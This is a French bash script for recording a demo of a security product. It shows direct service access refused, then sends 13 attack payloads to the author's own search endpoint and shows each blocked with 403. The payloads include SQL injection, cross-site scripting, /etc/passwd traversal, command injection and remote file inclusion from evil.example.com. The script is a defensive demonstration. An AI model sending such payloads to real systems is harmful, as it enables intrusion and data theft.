#!/bin/bash
# =============================================================================
# SCRIPT DE TOURNAGE — démonstration MENAL (parties terminal)
# =============================================================================
# À lancer pendant que tu filmes ton écran. Il joue chaque preuve proprement,
# avec un titre et une PAUSE avant chaque plan (appuie sur Entrée quand ta
# narration est prête). Les résultats réels s'affichent en gros et lisibles.
#
# Usage :   bash scripts/demo-tournage.sh
# Prérequis : Git Bash, curl. Rien d'autre (aucune clé, aucune install).
# Écran : zoom terminal 150 %, thème sombre, police large.
# =============================================================================

BASE="https://elson.menal-sarl.com"
API="https://api-staging.menal-sarl.com"
RUN_DIRECT="https://elson-web-staging-slxt6oscea-ew.a.run.app"

# couleurs
G='\033[1;32m'; R='\033[1;31m'; C='\033[1;36m'; Y='\033[1;33m'; B='\033[1m'; N='\033[0m'

pause() { echo ""; read -p "$(echo -e "${Y}   ↳ [Entrée] quand ta narration est prête…${N}")" _; echo ""; }
titre() { clear; echo ""; echo -e "${C}══════════════════════════════════════════════════════════════${N}"; echo -e "${C}  $1${N}"; echo -e "${C}══════════════════════════════════════════════════════════════${N}"; echo ""; }

# -----------------------------------------------------------------------------
titre "PRÉPARATION — réveil des services (hors caméra, avant de filmer)"
echo "   Réveille ELSON, l'API et le dashboard (évite le démarrage à froid)…"
curl -s -o /dev/null "$BASE/" ; curl -s -o /dev/null "$API/health" ; curl -s -o /dev/null "https://dashboard.menal-sarl.com/login"
echo -e "   ${G}Services réveillés.${N}"
echo ""
echo -e "   ${Y}RAPPEL : lance l'attaque (plus bas) ~15 min AVANT de filmer le dashboard,${N}"
echo -e "   ${Y}pour que la détection ET la qualification ATT&CK soient déjà présentes.${N}"
pause

# -----------------------------------------------------------------------------
titre "PLAN 7 — ZERO TRUST : rien n'est joignable directement"
echo -e "   ${B}1) L'adresse directe du service (celle du fournisseur) →${N}"
printf "   %-55s " "curl $RUN_DIRECT/"
code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 20 "$RUN_DIRECT/")
echo -e "${R}${code}  (refusé)${N}"
echo ""
echo -e "   ${B}2) Le domaine public, à travers le filtrage →${N}"
printf "   %-55s " "curl $BASE/"
code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 20 "$BASE/")
echo -e "${G}${code}  (servi)${N}"
echo ""
echo -e "   ${C}→ Ce n'est pas la position réseau qui autorise seule : au déploiement,${N}"
echo -e "   ${C}  l'identité fédérée sans clé décide (0 clé / 8 comptes). Deux couches.${N}"
pause

# -----------------------------------------------------------------------------
titre "PLAN 8 — L'ATTAQUE : 13 requêtes malveillantes → 403, 1 légitime → 200"
echo -e "   ${B}13 charges (injection SQL, script inter-sites, inclusion de fichier)…${N}"
echo ""
i=0
for p in \
  "q=' UNION SELECT NULL,version()--" "q=1' OR '1'='1" "q=<script>alert(1)</script>" \
  "q=x\" onmouseover=alert(1)" "file=/etc/passwd" "file=../../../etc/passwd" \
  "cmd=;cat /etc/hosts" "page=http://evil.example.com/s.txt" "path=....//....//etc/passwd" \
  "id=1 OR 1=1" "q=<img src=x onerror=alert(1)>" "file=/proc/self/environ" "q=admin'--" ; do
  i=$((i+1))
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 20 -G "$BASE/api/search" --data-urlencode "$p")
  printf "   requête %2d/13  →  " "$i"
  [ "$code" = "403" ] && echo -e "${R}${code} bloquée${N}" || echo -e "${Y}${code}${N}"
done
echo ""
printf "   requête légitime (/api/health)  →  "
code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 20 "$BASE/api/health")
echo -e "${G}${code} servie${N}"
echo ""
echo -e "   ${C}→ 13 refus 403 par le filtrage applicatif, avant d'atteindre ELSON.${N}"
pause

# -----------------------------------------------------------------------------
titre "CARTON DE MONTAGE — « ~2 minutes plus tard »"
echo -e "   ${Y}Coupe ici au montage. La règle observe une fenêtre de 15 min et${N}"
echo -e "   ${Y}s'exécute toutes les 5 min : la détection tombe en ~2 min (mesuré 1 min 48 s).${N}"
echo ""
echo -e "   ${B}La suite se filme sur le DASHBOARD (dashboard.menal-sarl.com) :${N}"
echo -e "     • Plan 9  — écran Détections : R2/R3/R6, « 13 requêtes bloquées… en 15 min »"
echo -e "     • Plan 10 — fiche incident → Card « Le socle propose » : T1003.008 à 0,71"
echo -e "     • Plan 11 — Card « Décision humaine » → clic « Vrai positif »"
echo ""
echo -e "   ${G}Fin de la partie terminal. Bon tournage.${N}"
echo ""
